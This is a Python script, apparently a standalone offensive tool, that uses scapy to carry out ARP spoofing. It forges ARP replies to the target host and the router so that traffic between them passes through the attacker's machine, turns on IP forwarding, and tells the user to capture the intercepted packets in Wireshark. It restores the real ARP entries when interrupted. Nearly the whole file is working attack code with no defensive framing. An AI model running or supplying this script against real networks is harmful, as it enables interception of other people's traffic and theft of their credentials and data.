from scapy.all import *
import time
import os
from getmac import get_mac_address
from getmac import get_mac_address as gma
from colorama import init, Fore


if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'.")
    exit(0)




init()

GREEN = Fore.GREEN
RED   = Fore.RED
YELLOW = Fore.YELLOW
RESET = Fore.RESET
BLUE  = Fore.BLUE



try:
    os.system('sysctl -w net.ipv4.ip_forward=1')
except:
    print("Error.")
your_mac = gma()

target_ip = input("Target Ip -> ")
target_mac = get_mac_address(ip=target_ip)
router_ip = input("Router Ip -> ")
router_mac = get_mac_address(ip=router_ip)
timee = int(input("Enter the time sleep between arp replay and another replay [default=1]: ") or "1")

try:
    print(f"{GREEN}Open wireshark and Spoof all packets does transferred between Target And Router{RESET}")
    while True:
        # for target
        arp_replay_t = ARP(op=2,pdst=str(target_ip),psrc=str(router_ip),hwdst=str(target_mac),hwsrc=str(your_mac))
        # for Router
        arp_replay_r = ARP(op=2,pdst=str(router_ip),psrc=str(target_ip),hwdst=str(router_mac),hwsrc=str(your_mac))

        send(arp_replay_t)

        send(arp_replay_r)
        # time sleep between arp replay and another arp raplay
        time.sleep(timee)
except KeyboardInterrupt as err:
    # Reset all action in target
    arp_replay_target_real = ARP(op=2,pdst=str(target_ip),psrc=str(router_ip),hwdst=str(target_mac),hwsrc=str(router_mac))
    # Reset all action in Router
    arp_replay_router_real = ARP(op=2,pdst=str(router_ip),psrc=str(target_ip),hwdst=str(router_mac),hwsrc=str(target_mac))
    send(arp_replay_target_real)
    send(arp_replay_router_real)
    print("\nBy (:")
